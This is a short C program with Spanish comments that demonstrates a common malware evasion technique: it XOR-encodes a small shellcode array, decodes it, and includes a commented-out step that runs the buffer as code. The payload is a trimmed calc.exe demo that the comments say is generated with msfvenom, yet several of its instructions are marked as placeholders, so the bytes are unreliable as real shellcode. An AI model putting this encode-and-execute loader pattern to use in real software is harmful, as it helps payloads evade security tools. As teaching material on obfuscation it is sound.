#include <stdio.h>
#include <windows.h>

//=============================================
// Codificador/Decodificador XOR con clave de 1 byte
//=============================================
// Funciona para codificar y decodificar gracias a la simetría del XOR.
// Ejemplo: ABBA
//
// buffer: puntero a los datos (puede ser texto plano o cifrado)
// size: cantidad de bytes a procesar
// key: clave XOR de 1 byte para ofuscar el buffer
void EncodeXOR_StaticByte(unsigned char* buffer, size_t size, unsigned char key) {
    for (size_t index = 0; index < size; index++) {
        buffer[index] ^= key; // XORea cada byte con la clave
    }
}

int main() {
    //==========================================
    // Shellcode simulado: Ejecutar calc.exe (x86)
    //==========================================
    // Versión recortada para demo solamente
    // El shellcode original completo suele tener ~220-300 bytes
    //
    // Generado con: msfvenom -p windows/exec CMD=calc.exe -f c -b "\x00"
    unsigned char shellcode[] = {
        0x31, 0xC9,                   // xor ecx, ecx
        0x51,                         // push ecx
        0x68, 0x63, 0x61, 0x6C, 0x63, // push 'calc'
        0x54,                         // push esp
        0x88, 0xC7,                   // mov al, cl
        0x93,                         // xchg eax, ebx (ejemplo placeholder)
        0xC2, 0x77,                   // ret 0x77 (ejemplo placeholder)
        0xFF, 0xD0                    // call eax
    };

    // Guardamos el tamaño original
    size_t shellcode_len = sizeof(shellcode);

    // Clave XOR para codificar (1 byte)
    unsigned char xor_key = 0x5A; // clave arbitraria (0x5A = 'Z')

    printf("[*] Shellcode original:\n");
    for (size_t i = 0; i < shellcode_len; i++) {
        printf("\\x%02X", shellcode[i]);
    }
    printf("\n");

    // Paso 1: Codificar el shellcode
    EncodeXOR_StaticByte(shellcode, shellcode_len, xor_key);
    printf("[*] Shellcode codificado (XOR con 0x%02X):\n", xor_key);
    for (size_t i = 0; i < shellcode_len; i++) {
        printf("\\x%02X", shellcode[i]);
    }
    printf("\n");

    // Paso 2: Decodificar antes de ejecutar (misma función, XOR otra vez)
    EncodeXOR_StaticByte(shellcode, shellcode_len, xor_key);

    printf("[*] Shellcode decodificado (listo para ejecutar):\n");
    for (size_t i = 0; i < shellcode_len; i++) {
        printf("\\x%02X", shellcode[i]);
    }
    printf("\n");

    // =====================
    // Paso 3 (opcional): Ejecutar el shellcode
    // Descomentar a riesgo propio - esto va a abrir calc.exe
    //
    // void(*exec)() = (void(*)())shellcode;
    // exec();

    return 0;
}
